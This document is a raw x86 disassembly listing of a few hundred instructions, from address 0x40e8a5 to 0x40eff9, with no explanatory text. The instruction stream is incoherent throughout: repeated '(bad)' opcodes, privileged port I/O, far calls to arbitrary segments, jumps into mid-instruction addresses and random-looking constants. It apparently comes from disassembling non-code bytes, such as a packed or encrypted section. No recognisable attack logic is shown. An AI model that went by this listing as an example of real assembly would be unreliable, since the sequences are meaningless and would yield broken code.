  40e8a5:	shl    DWORD PTR [esi-0x2c103201],cl
  40e8ab:	mov    esp,0x6e77749
  40e8b0:	ins    DWORD PTR es:[edi],dx
  40e8b1:	sbb    ecx,ecx
  40e8b3:	fs repz pop es
  40e8b6:	and    ch,BYTE PTR [eax-0x367976]
  40e8bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8bd:	fdiv   QWORD PTR [edx]
  40e8bf:	push   ds
  40e8c0:	cs dec ebp
  40e8c2:	adc    dl,bh
  40e8c4:	add    al,0x9d
  40e8c6:	ds into 
  40e8c8:	je     0x40e93f
  40e8ca:	xor    eax,0xf7bf9885
  40e8cf:	in     al,0x6f
  40e8d1:	mov    edi,0x7b21b41b
  40e8d6:	rcr    BYTE PTR [edi+0x3ac6c704],1
  40e8dc:	cmp    edi,edi
  40e8de:	je     0x40e910
  40e8e0:	sub    ah,BYTE PTR [ebx+eiz*8]
  40e8e3:	add    BYTE PTR [edi],ch
  40e8e5:	and    DWORD PTR [edi],0xffffffb9
  40e8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8e9:	test   BYTE PTR [ebp-0x74],bl
  40e8ec:	push   esi
  40e8ed:	in     eax,0xd4
  40e8ef:	psubsb mm7,QWORD PTR [edx]
  40e8f2:	pop    es
  40e8f3:	pop    eax
  40e8f4:	push   ebx
  40e8f5:	fwait
  40e8f6:	mov    eax,DWORD PTR [esi-0x6c]
  40e8f9:	daa    
  40e8fa:	inc    esi
  40e8fb:	push   edx
  40e8fc:	push   0xffffff88
  40e8fe:	(bad)  
  40e8ff:	imul   esp,DWORD PTR [edx-0x7049be86],0x50
  40e906:	sub    BYTE PTR [ecx-0x45],ch
  40e909:	lahf   
  40e90a:	test   DWORD PTR [ebx+0x10e06d8d],eax
  40e910:	stos   BYTE PTR es:[edi],al
  40e911:	push   edx
  40e912:	mov    bl,0x26
  40e914:	mov    eax,ebp
  40e916:	inc    edx
  40e917:	ud2    
  40e919:	pop    ebp
  40e91a:	ds sti 
  40e91c:	mov    bh,0xf6
  40e91e:	in     al,0x20
  40e920:	and    BYTE PTR [ebx],dh
  40e922:	cmc    
  40e923:	mov    ds:0x7f07cfe,eax
  40e928:	cli    
  40e929:	cmp    DWORD PTR [ecx+0x43552f38],edx
  40e92f:	rcr    BYTE PTR [ebx],cl
  40e931:	xchg   ecx,eax
  40e932:	mov    al,ds:0x25fca93b
  40e937:	adc    BYTE PTR [edi+0x5639d374],0xbd
  40e93e:	lea    esi,[eax+0x14]
  40e941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e942:	(bad)  
  40e943:	ja     0x40e9c3
  40e945:	pop    ss
  40e946:	cld    
  40e947:	pop    ebp
  40e948:	jle    0x40e8cd
  40e94a:	dec    ebx
  40e94b:	jmp    0x7285:0xd8a5f608
  40e952:	adc    al,0x56
  40e954:	sbb    BYTE PTR [edi-0x4e4aa01],0x6d
  40e95b:	mov    edi,?
  40e95d:	mov    ch,0x4d
  40e95f:	das    
  40e960:	in     al,0x38
  40e962:	lock hlt 
  40e964:	push   0x1b7afb2a
  40e969:	ret    0x3be
  40e96c:	mov    WORD PTR ds:0x9163971d,ds
  40e972:	xchg   ecx,eax
  40e973:	imul   ebp,ebx,0xdb80b9ce
  40e979:	mov    ebp,DWORD PTR [edi-0x50]
  40e97c:	in     al,0xa
  40e97e:	fld    DWORD PTR [ecx+0x24396f15]
  40e984:	mov    al,ds:0x99721e65
  40e989:	call   0xf31d:0xcbaef3d3
  40e990:	test   esi,esi
  40e992:	push   ds
  40e993:	lods   eax,DWORD PTR ds:[esi]
  40e994:	mov    gs:0x2195223b,al
  40e99a:	dec    edx
  40e99b:	push   cs
  40e99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e99d:	mov    WORD PTR [eax],fs
  40e99f:	pop    edi
  40e9a0:	das    
  40e9a1:	leave  
  40e9a2:	sub    al,0x7
  40e9a4:	jmp    0x40e99b
  40e9a6:	adc    eax,0x25128336
  40e9ab:	xor    cl,BYTE PTR [ecx-0x36]
  40e9ae:	imul   esp,DWORD PTR [esi],0x2903a2de
  40e9b4:	push   ss
  40e9b5:	fcom   QWORD PTR [esi+0x21d4a0c8]
  40e9bb:	push   ebp
  40e9bc:	lock mov ebx,0xb4c3db34
  40e9c2:	push   cs
  40e9c3:	cmp    DWORD PTR [edx-0x58],edi
  40e9c6:	es xchg esi,eax
  40e9c8:	test   dl,dl
  40e9ca:	jp     0x40ea0a
  40e9cc:	adc    DWORD PTR ds:0x4d0b2927,0xfa41d52c
  40e9d6:	iret   
  40e9d7:	scas   eax,DWORD PTR es:[edi]
  40e9d8:	in     eax,dx
  40e9d9:	out    dx,al
  40e9da:	push   esp
  40e9db:	scas   eax,DWORD PTR es:[edi]
  40e9dc:	(bad)
  40e9df:	inc    eax
  40e9e0:	inc    ebx
  40e9e1:	mov    eax,ds:0x2108887
  40e9e6:	dec    eax
  40e9e7:	inc    esp
  40e9e8:	bound  esp,QWORD PTR [ebp-0x5c]
  40e9eb:	inc    esi
  40e9ec:	call   0xdbe2:0x401f32db
  40e9f3:	pusha  
  40e9f4:	fld    DWORD PTR [ecx]
  40e9f6:	mov    ch,0xfa
  40e9f8:	in     ax,dx
  40e9fa:	outs   dx,BYTE PTR ds:[esi]
  40e9fb:	pop    edi
  40e9fc:	sbb    bl,BYTE PTR [ebx]
  40e9fe:	call   0x6fd2:0x85d07892
  40ea05:	popf   
  40ea06:	(bad)  
  40ea07:	int    0x49
  40ea09:	in     eax,0x41
  40ea0b:	js     0x40ea78
  40ea0d:	and    eax,0x13040e1a
  40ea12:	and    DWORD PTR es:[eax+0x2ba22324],ebp
  40ea19:	cmc    
  40ea1a:	sti    
  40ea1b:	mov    ecx,0xbb1c276
  40ea20:	test   al,0x51
  40ea22:	xor    BYTE PTR [esp+eiz*2],dh
  40ea25:	shl    BYTE PTR [eax-0x73be75f9],0xe2
  40ea2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea2d:	test   eax,0x9a7036e
  40ea32:	rol    BYTE PTR [edx+0xd],1
  40ea35:	fucom  st(6)
  40ea37:	xor    al,dh
  40ea39:	imul   esi,DWORD PTR [esi],0xffffffba
  40ea3c:	fadd   DWORD PTR [ecx+esi*4+0x7]
  40ea40:	daa    
  40ea41:	fst    QWORD PTR [ecx+eax*2]
  40ea44:	xor    ecx,ebx
  40ea46:	mov    ds:0xed751738,al
  40ea4b:	fwait
  40ea4c:	rcl    BYTE PTR [edi],cl
  40ea4e:	fs push ss
  40ea50:	test   DWORD PTR [ecx-0x38985020],0x9d91748e
  40ea5a:	mov    ds:0x69bee487,eax
  40ea5f:	sbb    BYTE PTR [edx+0x3129ed6a],bl
  40ea65:	add    ecx,DWORD PTR [edi]
  40ea67:	loop   0x40ea4c
  40ea69:	mov    eax,ds:0x50e61b30
  40ea6e:	mov    eax,0x4450ed73
  40ea73:	or     bl,BYTE PTR [ecx-0x1e]
  40ea76:	dec    ebx
  40ea77:	out    0x41,eax
  40ea79:	sub    eax,0x65b4016b
  40ea7e:	ja     0x40ea19
  40ea80:	test   DWORD PTR [eax],eax
  40ea82:	scas   al,BYTE PTR es:[edi]
  40ea83:	mov    esp,0x35acafd6
  40ea88:	sbb    al,0x7c
  40ea8a:	(bad)  
  40ea8b:	fdivr  QWORD PTR [esi-0x78f385a9]
  40ea91:	fdiv   QWORD PTR [ecx]
  40ea93:	or     BYTE PTR [edi-0x1e],0x29
  40ea97:	inc    ebx
  40ea98:	out    dx,eax
  40ea99:	out    dx,al
  40ea9a:	mov    ecx,0x7ec06ac7
  40ea9f:	inc    eax
  40eaa0:	xor    DWORD PTR [esp+eiz*2-0x7b],0xe68e3b9e
  40eaa8:	gs jnp 0x40eabe
  40eaab:	aad    0x99
  40eaad:	sub    BYTE PTR [esi+0x41],dl
  40eab0:	ins    DWORD PTR es:[edi],dx
  40eab1:	push   esi
  40eab2:	sahf   
  40eab3:	ficom  DWORD PTR [eax]
  40eab5:	push   ebp
  40eab6:	clc    
  40eab7:	dec    esi
  40eab8:	into   
  40eab9:	test   BYTE PTR [ebx-0x700c357c],0x67
  40eac0:	in     al,dx
  40eac1:	mov    edx,0x6dd0008a
  40eac6:	ss push es
  40eac8:	or     eax,DWORD PTR [edi-0x6761b239]
  40eace:	repnz mov dl,0xf5
  40ead1:	outs   dx,DWORD PTR ds:[si]
  40ead3:	std    
  40ead4:	sbb    ebp,ebp
  40ead6:	scas   al,BYTE PTR es:[edi]
  40ead7:	adc    al,0x48
  40ead9:	scas   al,BYTE PTR es:[edi]
  40eada:	call   0x84ea:0x4551811
  40eae1:	xlat   BYTE PTR ds:[ebx]
  40eae2:	add    ebp,DWORD PTR [edi]
  40eae4:	imul   ebp,DWORD PTR [edx-0x3e1ea1f2],0x3b
  40eaeb:	and    eax,0xcd42edd9
  40eaf0:	cld    
  40eaf1:	ret    
  40eaf2:	jae    0x40eaa8
  40eaf4:	push   eax
  40eaf5:	out    dx,eax
  40eaf6:	test   DWORD PTR [ebx-0x5c],ebp
  40eaf9:	icebp  
  40eafa:	adc    ah,ah
  40eafc:	rcl    DWORD PTR [edi],cl
  40eafe:	dec    ebx
  40eaff:	dec    ecx
  40eb00:	cmp    al,0xa5
  40eb02:	int    0xf2
  40eb04:	xchg   ecx,eax
  40eb05:	jae    0x40eb26
  40eb07:	ds loopne 0x40eb86
  40eb0a:	or     DWORD PTR [di],edi
  40eb0d:	xchg   esi,eax
  40eb0e:	mov    esi,0x895ef9c4
  40eb13:	xchg   edi,eax
  40eb14:	scas   eax,DWORD PTR es:[edi]
  40eb15:	call   0xae88:0xa05617c5
  40eb1c:	mov    bh,0x2e
  40eb1e:	sbb    edi,edx
  40eb20:	or     bh,dl
  40eb22:	lods   eax,DWORD PTR ds:[esi]
  40eb23:	lahf   
  40eb24:	pop    es
  40eb25:	push   edx
  40eb26:	scas   eax,DWORD PTR es:[edi]
  40eb27:	jo     0x40eb7f
  40eb29:	add    bh,bh
  40eb2b:	ja     0x40ead6
  40eb2d:	mov    cl,ch
  40eb2f:	inc    eax
  40eb30:	dec    esp
  40eb31:	fcom   DWORD PTR [ebp+edx*1-0x40853076]
  40eb38:	(bad)
  40eb3c:	mov    al,0x4
  40eb3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb3f:	push   0xffffff8e
  40eb41:	ret    
  40eb42:	sub    BYTE PTR [esi+0x40],cl
  40eb45:	xchg   DWORD PTR [ebp+0x1f],eax
  40eb48:	ja     0x40eace
  40eb4a:	pusha  
  40eb4b:	dec    eax
  40eb4c:	xchg   esi,eax
  40eb4d:	rep outs dx,DWORD PTR ds:[esi]
  40eb4f:	(bad)  
  40eb51:	adc    ah,BYTE PTR [edi-0x3e]
  40eb54:	enter  0xae2,0xb5
  40eb58:	ret    
  40eb59:	stos   BYTE PTR es:[edi],al
  40eb5a:	shl    BYTE PTR [eax-0x4],1
  40eb5d:	test   eax,0x80281a8e
  40eb62:	popa   
  40eb63:	shr    DWORD PTR [ecx+0x5c258243],1
  40eb69:	push   0x40cbf324
  40eb6e:	sub    dh,BYTE PTR [ebp+esi*8-0x667140ae]
  40eb75:	aas    
  40eb76:	repnz cwde 
  40eb78:	and    al,0xd
  40eb7a:	mov    bl,0x43
  40eb7c:	mov    DWORD PTR [esp+ecx*1],ebp
  40eb7f:	pop    ds
  40eb80:	pushf  
  40eb81:	call   0xb0a5cafc
  40eb86:	ss jmp 0x40eb41
  40eb89:	test   al,0xa8
  40eb8b:	mov    esp,0x85ce6b7b
  40eb90:	pusha  
  40eb91:	pop    ss
  40eb92:	pop    ecx
  40eb93:	ss jb  0x40ec0d
  40eb96:	ror    DWORD PTR [esi+0x67],1
  40eb99:	(bad)  
  40eb9a:	sub    al,dl
  40eb9c:	repz xor BYTE PTR [eax+0x7ecf617a],ah
  40eba3:	dec    ecx
  40eba4:	mov    ecx,DWORD PTR [ebx-0x1d]
  40eba7:	lds    ebp,FWORD PTR [edx]
  40eba9:	out    0x2d,eax
  40ebab:	add    bl,BYTE PTR [eax-0x4fcf9cf6]
  40ebb1:	push   es
  40ebb2:	or     al,BYTE PTR ds:0x41031b62
  40ebb8:	sbb    BYTE PTR ds:0xfd796335,0x96
  40ebbf:	stc    
  40ebc0:	cwde   
  40ebc1:	xchg   esi,eax
  40ebc2:	(bad)  
  40ebc3:	(bad)  
  40ebc4:	mov    ebx,0x555b8895
  40ebc9:	outs   dx,BYTE PTR ds:[esi]
  40ebca:	adc    edx,DWORD PTR [ecx+0x4736185f]
  40ebd0:	add    al,0xd0
  40ebd2:	inc    ecx
  40ebd3:	xchg   ecx,eax
  40ebd4:	in     eax,0x63
  40ebd6:	and    eax,0xf031adf4
  40ebdb:	mov    eax,0xe4f9f30d
  40ebe0:	add    BYTE PTR [esi-0x181a9ac2],cl
  40ebe6:	dec    ebp
  40ebe7:	pop    DWORD PTR [edx+0x60]
  40ebea:	and    DWORD PTR [ecx-0x71fee68d],ebx
  40ebf0:	test   DWORD PTR ds:0x53672521,ebx
  40ebf6:	sub    ebp,DWORD PTR [esi-0x3d9dbdbf]
  40ebfc:	imul   ebx
  40ebfe:	mov    ebp,0x7e9e1ba
  40ec03:	pop    esp
  40ec04:	and    al,0xf
  40ec06:	mov    esp,0x66991641
  40ec0b:	repnz cmp eax,0x85019e1c
  40ec11:	mov    dl,0xe8
  40ec13:	js     0x40ebb9
  40ec15:	xor    ebx,DWORD PTR [ebx+0x4a]
  40ec18:	jp     0x40ebf2
  40ec1a:	jp     0x40ec18
  40ec1c:	cmp    al,0xfc
  40ec1e:	dec    esp
  40ec1f:	ins    BYTE PTR es:[edi],dx
  40ec20:	imul   edi,DWORD PTR [esp+ecx*8-0x7f0ade31],0xffffffea
  40ec28:	pop    esi
  40ec29:	ret    
  40ec2a:	test   al,0xeb
  40ec2c:	cmp    bh,BYTE PTR [eax]
  40ec2e:	push   0xbb4fc8dc
  40ec33:	cmp    ebx,edx
  40ec35:	outs   dx,DWORD PTR ds:[esi]
  40ec36:	sbb    bl,bl
  40ec38:	xor    ch,BYTE PTR [eax-0x7d790b53]
  40ec3e:	push   esp
  40ec3f:	dec    eax
  40ec40:	xlat   BYTE PTR ds:[ebx]
  40ec41:	fucomip st,st(6)
  40ec43:	pop    esp
  40ec44:	retf   
  40ec45:	fs cmp al,0x78
  40ec48:	or     eax,0x9b6fc1e2
  40ec4d:	lods   al,BYTE PTR ds:[esi]
  40ec4e:	mov    ecx,0x3e73da0f
  40ec53:	xchg   ebp,eax
  40ec54:	mov    ds:0xe93ffaf8,eax
  40ec59:	dec    edx
  40ec5a:	xchg   ebx,eax
  40ec5b:	add    al,BYTE PTR [eax]
  40ec5d:	dec    edx
  40ec5e:	or     bl,BYTE PTR [ebx]
  40ec60:	lds    ecx,FWORD PTR [ebx-0x97854cc]
  40ec66:	mov    esi,0xded5f761
  40ec6b:	sbb    BYTE PTR [eax+esi*1+0x6bbd20b1],ch
  40ec72:	loope  0x40ec75
  40ec74:	push   ebp
  40ec75:	inc    esi
  40ec76:	and    dh,dl
  40ec78:	imul   esp,ecx,0x47aafd02
  40ec7e:	mov    ecx,0x355442f5
  40ec83:	outs   dx,BYTE PTR ds:[esi]
  40ec84:	shl    BYTE PTR [edx+0xa],0xa6
  40ec88:	inc    ecx
  40ec89:	cmp    BYTE PTR [ebx+0xc],0xfb
  40ec8d:	cwde   
  40ec8e:	adc    esi,DWORD PTR [ecx-0xa]
  40ec91:	push   edi
  40ec92:	out    dx,eax
  40ec93:	ss sbb ch,0x7f
  40ec97:	adc    DWORD PTR [esi-0x4de9dae5],esp
  40ec9d:	rol    DWORD PTR [eax],0x23
  40eca0:	push   es
  40eca1:	or     DWORD PTR [ecx+0x68],esp
  40eca4:	rcr    DWORD PTR [edi+0x7234c71e],1
  40ecaa:	push   edx
  40ecab:	stos   DWORD PTR es:[di],eax
  40ecad:	dec    eax
  40ecae:	scas   eax,DWORD PTR es:[edi]
  40ecaf:	stos   BYTE PTR es:[edi],al
  40ecb0:	dec    esp
  40ecb1:	or     al,0x67
  40ecb3:	or     DWORD PTR [edi+0x48],edx
  40ecb6:	push   esi
  40ecb7:	and    eax,0xb1a91a0f
  40ecbc:	xor    al,BYTE PTR [ebp+0x5f7a1a97]
  40ecc2:	stc    
  40ecc3:	pop    eax
  40ecc4:	pop    es
  40ecc5:	jmp    DWORD PTR [eax+edx*2+0x3d]
  40ecc9:	fucomp st(5)
  40eccb:	test   BYTE PTR [eax+eax*1],0x61
  40eccf:	outs   dx,DWORD PTR ds:[esi]
  40ecd0:	(bad)  
  40ecd1:	or     esp,esi
  40ecd3:	stc    
  40ecd4:	sti    
  40ecd5:	and    al,BYTE PTR [eax+0x0]
  40ecd8:	cwde   
  40ecd9:	scas   eax,DWORD PTR es:[edi]
  40ecda:	scas   al,BYTE PTR es:[edi]
  40ecdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecdc:	or     DWORD PTR [esi],0xebe9f380
  40ece2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ece3:	aad    0xbc
  40ece5:	cli    
  40ece6:	inc    ecx
  40ece7:	int3   
  40ece8:	mov    esi,ebp
  40ecea:	or     edi,ebp
  40ecec:	ror    BYTE PTR [eax],cl
  40ecee:	je     0x40ecb7
  40ecf0:	dec    esi
  40ecf1:	mov    ebp,0x7dcd8591
  40ecf6:	enter  0x674e,0xb3
  40ecfa:	dec    esp
  40ecfb:	lea    edi,[ebp+0x1ef2b803]
  40ed01:	rol    esp,1
  40ed03:	dec    edi
  40ed04:	xor    eax,0xbcec4adb
  40ed09:	push   cs
  40ed0a:	(bad)  
  40ed0b:	sbb    cl,BYTE PTR [ebx+0xc]
  40ed0e:	or     al,0xf5
  40ed10:	mov    eax,ds:0x539c5e3
  40ed15:	int    0xc1
  40ed17:	jg     0x40ed34
  40ed19:	inc    esi
  40ed1a:	rcl    DWORD PTR [esi-0x3],cl
  40ed1d:	cmp    DWORD PTR [ebp+0x3bcbb5bb],esp
  40ed23:	pop    eax
  40ed24:	pop    es
  40ed25:	fist   WORD PTR [edi-0x48ea815e]
  40ed2b:	into   
  40ed2c:	stc    
  40ed2d:	cmp    eax,0xb292900f
  40ed32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed33:	cmp    ebp,DWORD PTR [ebx+ecx*1-0x60bd94a]
  40ed3a:	sub    al,0xe2
  40ed3c:	cmp    eax,0x86f329d1
  40ed41:	mov    ch,0xc9
  40ed43:	retf   0xe4ac
  40ed46:	dec    esp
  40ed47:	mov    ds:0xa73552b4,eax
  40ed4c:	gs loop 0x40ed85
  40ed4f:	pushf  
  40ed50:	sbb    ecx,DWORD PTR [edx-0x20ed2538]
  40ed56:	out    dx,eax
  40ed57:	sbb    eax,esi
  40ed59:	(bad)  
  40ed5a:	jb     0x40ed5d
  40ed5c:	js     0x40ed45
  40ed5e:	mov    ah,0xfc
  40ed60:	push   cs
  40ed61:	pop    ecx
  40ed62:	aas    
  40ed63:	icebp  
  40ed64:	adc    cl,ch
  40ed66:	(bad)  
  40ed67:	lds    ecx,FWORD PTR [esi+0x6a]
  40ed6a:	fs retf 
  40ed6c:	or     eax,0x2650c1d
  40ed71:	loope  0x40ed7b
  40ed73:	stos   DWORD PTR es:[edi],eax
  40ed74:	out    dx,al
  40ed75:	inc    ebx
  40ed76:	adc    ah,BYTE PTR [edi]
  40ed78:	sbb    al,0x5b
  40ed7a:	in     eax,0x5c
  40ed7c:	imul   esi,DWORD PTR [ebx-0x7c],0xffffff82
  40ed80:	push   edx
  40ed81:	pusha  
  40ed82:	div    DWORD PTR [esi+0x6f460226]
  40ed88:	mov    eax,0x17ddbd89
  40ed8d:	pop    esp
  40ed8e:	push   ebp
  40ed8f:	xchg   ebx,eax
  40ed90:	fs mov edi,0xd1a1b634
  40ed96:	sar    DWORD PTR [esi+0x3b],1
  40ed99:	lods   al,BYTE PTR ds:[esi]
  40ed9a:	xor    BYTE PTR [edx-0x15881ee],ch
  40eda0:	es sbb eax,0xd1ef9ce2
  40eda6:	daa    
  40eda7:	mov    al,0xdb
  40eda9:	or     cl,ah
  40edab:	mov    eax,0x3388facc
  40edb0:	cmp    al,0x64
  40edb2:	pop    es
  40edb3:	fisubr DWORD PTR [eax]
  40edb5:	in     eax,dx
  40edb6:	das    
  40edb7:	(bad)  
  40edb8:	out    dx,al
  40edb9:	leave  
  40edba:	in     al,0xce
  40edbc:	icebp  
  40edbd:	into   
  40edbe:	in     eax,0x9f
  40edc0:	sti    
  40edc1:	movq   QWORD PTR [esi-0x4783c8c0],mm3
  40edc8:	or     BYTE PTR [edi+0x42ea2825],bh
  40edce:	imul   esp,DWORD PTR [esi-0x6a],0x3c
  40edd2:	dec    edx
  40edd3:	adc    cl,cl
  40edd5:	es or  al,0x81
  40edd8:	cmp    al,0xd4
  40edda:	inc    ecx
  40eddb:	stos   DWORD PTR es:[edi],eax
  40eddc:	daa    
  40eddd:	push   0xffffffc4
  40eddf:	push   edx
  40ede0:	mov    ds:0xe06af343,al
  40ede5:	fisttp WORD PTR [esi]
  40ede7:	and    edi,DWORD PTR [ecx-0x69b720c7]
  40eded:	xchg   esi,eax
  40edee:	add    edi,DWORD PTR [edx]
  40edf0:	iret   
  40edf1:	retf   0x9cc4
  40edf4:	or     BYTE PTR [edx],al
  40edf6:	cmc    
  40edf7:	not    DWORD PTR [ebx+0x392f3a7a]
  40edfd:	push   esp
  40edfe:	jecxz  0x40edcf
  40ee00:	xor    bl,BYTE PTR [ebp+0x47]
  40ee03:	aaa    
  40ee04:	jb     0x40edca
  40ee06:	in     al,dx
  40ee07:	pushf  
  40ee08:	jle    0x40ed91
  40ee0a:	popa   
  40ee0b:	out    0x9c,eax
  40ee0d:	ins    BYTE PTR es:[edi],dx
  40ee0e:	mov    ds:0x77f6f06f,eax
  40ee13:	loop   0x40ee11
  40ee15:	stos   DWORD PTR es:[edi],eax
  40ee16:	(bad)  
  40ee17:	fs push ebp
  40ee19:	rol    DWORD PTR [edx-0x5b],0xc4
  40ee1d:	(bad)  
  40ee1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee1f:	mov    BYTE PTR [ebx+0x5c],al
  40ee22:	and    al,0xc8
  40ee24:	mov    ebp,0xf0353a17
  40ee29:	into   
  40ee2a:	lea    ecx,[eax-0x1d]
  40ee2d:	fdivr  DWORD PTR [ebp+0x73ef8648]
  40ee33:	xchg   ecx,eax
  40ee34:	adc    al,0x90
  40ee36:	pop    es
  40ee37:	lds    esi,FWORD PTR [eax+0x0]
  40ee3a:	jmp    0xd9f37a60
  40ee3f:	sub    DWORD PTR [esi*8-0x5d45675f],esp
  40ee46:	dec    edx
  40ee47:	mov    DWORD PTR [eax+0x37],ebp
  40ee4a:	fwait
  40ee4b:	pop    esi
  40ee4c:	cmc    
  40ee4d:	push   es
  40ee4e:	int3   
  40ee4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee50:	dec    ebx
  40ee51:	and    ah,BYTE PTR gs:[edi]
  40ee54:	inc    esi
  40ee55:	mov    cl,0x91
  40ee57:	mov    BYTE PTR [esi+esi*8-0x122e31f4],ch
  40ee5e:	xlat   BYTE PTR ds:[ebx]
  40ee5f:	xchg   ecx,eax
  40ee60:	and    esp,DWORD PTR [edi-0xf61a8b8]
  40ee66:	lods   eax,DWORD PTR ds:[esi]
  40ee67:	fst    DWORD PTR [eax]
  40ee69:	dec    ebx
  40ee6a:	rcr    dh,cl
  40ee6c:	mov    bl,0x89
  40ee6e:	cli    
  40ee6f:	(bad)  
  40ee70:	dec    ebx
  40ee71:	inc    ebp
  40ee72:	ret    
  40ee73:	int3   
  40ee74:	lds    edx,FWORD PTR [ecx+0x71]
  40ee77:	jp     0x40ee64
  40ee79:	mov    esi,0x88e774b0
  40ee7e:	pop    ss
  40ee7f:	addr16 ret 
  40ee81:	mov    cl,0x8e
  40ee83:	lea    edx,[ebp+0x2b0d6e62]
  40ee89:	and    edi,edx
  40ee8b:	sbb    ecx,DWORD PTR [edi+0x32]
  40ee8e:	push   ss
  40ee8f:	fs push ds
  40ee91:	cmp    DWORD PTR [ebp-0x320afffd],eax
  40ee97:	ins    BYTE PTR es:[edi],dx
  40ee98:	lods   al,BYTE PTR ds:[esi]
  40ee99:	rol    DWORD PTR [esi],0x84
  40ee9c:	add    eax,0x997fbe70
  40eea1:	pop    eax
  40eea2:	out    0x8f,al
  40eea4:	xchg   esp,eax
  40eea5:	aad    0x1
  40eea7:	lods   al,BYTE PTR ds:[esi]
  40eea8:	cmp    eax,0x88135790
  40eead:	pushf  
  40eeae:	push   ecx
  40eeaf:	sbb    al,0x28
  40eeb1:	into   
  40eeb2:	cmp    eax,0x3fe4e68c
  40eeb7:	cmp    BYTE PTR [esi-0x73],ah
  40eeba:	jb     0x40ee5b
  40eebc:	cdq    
  40eebd:	enter  0xab38,0xf5
  40eec1:	add    al,0xb3
  40eec3:	or     eax,0x5ec78005
  40eec8:	sbb    BYTE PTR [ecx-0x52],bh
  40eecb:	out    0x3d,eax
  40eecd:	mov    edx,0x9fa3691c
  40eed2:	mov    ecx,0xbd9594ad
  40eed7:	les    edx,FWORD PTR [ecx]
  40eed9:	push   ecx
  40eeda:	shl    BYTE PTR [edx+0x6c],1
  40eedd:	jmp    0x404375ae
  40eee2:	pop    ebx
  40eee3:	xor    esp,DWORD PTR [edx+edi*4-0x3f]
  40eee7:	dec    eax
  40eee8:	pop    edi
  40eee9:	sbb    esi,edx
  40eeeb:	or     esp,DWORD PTR [edi-0x1ece0e78]
  40eef1:	int3   
  40eef2:	outs   dx,BYTE PTR ds:[esi]
  40eef3:	dec    eax
  40eef4:	mov    edi,?
  40eef6:	mov    al,ds:0xe17e2d65
  40eefb:	shl    DWORD PTR [edi],0xae
  40eefe:	pop    ds
  40eeff:	ret    0xbf92
  40ef02:	add    eax,0x9e044956
  40ef07:	or     edi,ecx
  40ef09:	shr    BYTE PTR [edi],cl
  40ef0b:	in     eax,dx
  40ef0c:	add    DWORD PTR [ebx+0x69629c64],0xbf250cc4
  40ef16:	and    dh,BYTE PTR [ebx+0x55]
  40ef19:	mov    BYTE PTR [ebp+0x58451a51],bh
  40ef1f:	neg    BYTE PTR [edx-0x55]
  40ef22:	lock mov ds:0x3785e7b0,eax
  40ef28:	in     eax,dx
  40ef29:	or     edx,DWORD PTR [ebx-0x6228fc32]
  40ef2f:	fs push 0x64a0f0c4
  40ef35:	mov    ebx,0x5c3ad7dd
  40ef3a:	test   BYTE PTR [ecx+0x49b224e2],bh
  40ef40:	aaa    
  40ef41:	xor    eax,0x888a01b1
  40ef46:	push   ds
  40ef47:	mov    cl,0x8b
  40ef49:	inc    esi
  40ef4a:	xchg   edx,eax
  40ef4b:	mov    ah,0xe8
  40ef4d:	ins    DWORD PTR es:[edi],dx
  40ef4e:	loop   0x40ef7e
  40ef50:	cwde   
  40ef51:	inc    ebp
  40ef52:	jb     0x40efc3
  40ef54:	xchg   edi,eax
  40ef55:	test   al,0xcc
  40ef57:	test   BYTE PTR [edi+0x13fae8c5],al
  40ef5d:	scas   al,BYTE PTR es:[edi]
  40ef5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef5f:	test   eax,0xd6678fc3
  40ef64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef65:	aad    0x11
  40ef67:	or     al,0xb5
  40ef69:	repnz mov ecx,0xc1254b21
  40ef6f:	mov    cl,0x92
  40ef71:	inc    ebp
  40ef72:	imul   ebx,DWORD PTR [edx],0xee39e9a3
  40ef78:	fucomp st(3)
  40ef7a:	test   eax,0x173878cf
  40ef7f:	scas   al,BYTE PTR es:[edi]
  40ef80:	imul   edi,ebx,0xffffffaf
  40ef83:	ficomp DWORD PTR [ecx-0xb263b58]
  40ef89:	ret    
  40ef8a:	dec    ebp
  40ef8b:	cmp    al,0x3f
  40ef8d:	and    BYTE PTR [esi-0x1e],ah
  40ef90:	dec    ebx
  40ef91:	fyl2xp1 
  40ef93:	ja     0x40ef68
  40ef95:	in     al,0x4e
  40ef97:	mov    eax,0x626043c2
  40ef9c:	ret    
  40ef9d:	pop    edi
  40ef9e:	repz jo 0x40ef39
  40efa1:	(bad)  
  40efa3:	xlat   BYTE PTR ds:[ebx]
  40efa4:	xlat   BYTE PTR ds:[ebx]
  40efa5:	push   cs
  40efa6:	xor    eax,0x31c6eae0
  40efab:	push   esp
  40efac:	imul   eax,DWORD PTR [edi-0x5f1e0a70],0x70
  40efb3:	lds    ebp,FWORD PTR [edx-0x75]
  40efb6:	or     al,0xca
  40efb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efb9:	adc    ah,BYTE PTR [edx+0x46369e29]
  40efbf:	retf   
  40efc0:	mov    ch,0x5b
  40efc2:	mov    al,ds:0x6cbf9edf
  40efc7:	cld    
  40efc8:	(bad)  
  40efc9:	repz int 0x39
  40efcc:	add    BYTE PTR [eax],ch
  40efce:	jns    0x40eff2
  40efd0:	mov    DWORD PTR [edx],esi
  40efd2:	fsubr  DWORD PTR [ecx+eax*4+0x25]
  40efd6:	fucomi st,st(3)
  40efd8:	sub    al,ah
  40efda:	cli    
  40efdb:	mov    ecx,0xe6ec71e2
  40efe0:	xor    BYTE PTR [edi+edx*2-0x18],dh
  40efe4:	and    eax,esi
  40efe6:	fmul   st,st(5)
  40efe8:	jb     0x40f052
  40efea:	test   BYTE PTR ds:0x79161b26,al
  40eff0:	lahf   
  40eff1:	adc    eax,0x7d995bcc
  40eff6:	jo     0x40efae
  40eff8:	pushf  
  40eff9:	push   ebp
